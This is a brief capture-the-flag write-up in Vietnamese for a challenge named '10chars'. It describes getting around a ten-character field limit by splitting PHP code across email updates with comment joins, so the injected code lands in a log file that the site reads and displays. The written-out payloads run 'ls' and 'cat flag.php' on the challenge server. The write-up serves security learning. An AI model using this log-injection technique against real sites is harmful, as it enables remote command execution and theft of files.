Chúng ta truy cập vào trang http://10chars.scoreboard.ns01.info/index.php?page=login.php và có giao diện:

![alt text](https://raw.githubusercontent.com/Alic3Margatroid/ctfsv/master/10char/login.PNG)

Đăng ký user, nhận thấy các trường đều bị giới hạn lượng ký tự là 10. Đăng nhập vào ta có:

![alt text](https://raw.githubusercontent.com/Alic3Margatroid/ctfsv/master/10char/home.PNG)

Chức năng log:

![alt text](https://raw.githubusercontent.com/Alic3Margatroid/ctfsv/master/10char/log.PNG)

và chức năng log sau khi chúng ta thử đổi thay đổi thông tin cá nhân (email):

![alt text](https://raw.githubusercontent.com/Alic3Margatroid/ctfsv/master/10char/alt-log.PNG)

Có thể thấy khi chúng ta thay đổi email, thông tin sẽ được log lại vào 1 file log nào đó, sau đó chức năng log sẽ đọc file này rồi in ra màn hình. Điều này dẫn tới ý tưởng inject code php để chạy system command. Tuy nhiên 1 email chỉ có 10 ký tự, và log kèm email còn có 1 string khác, nên ta sẽ bypass việc này bằng cách chèn comment /**/ giữa các dòng.

Gửi các dòng như sau:
<?php /*
*/$a=/*
*/'ls';/*
*/system/*
*/($a)/*
*/;?>
với parameter là email, vào log ta sẽ được:

![alt text](https://raw.githubusercontent.com/Alic3Margatroid/ctfsv/master/10char/ls.PNG)

Tương tự như trên, gửi các dòng
<?php /*
*/$a=/*
*/'cat '/*
*/.'fla'/*
*/.'g.p'/*
*/.'hp';/*
*/system/*
*/($a)/*
*/;?>
để đọc flag.php sẽ được:

![alt text](https://raw.githubusercontent.com/Alic3Margatroid/ctfsv/master/10char/flag.PNG)

flag: Flag{_0nLy_10Ch4RAct3r_}
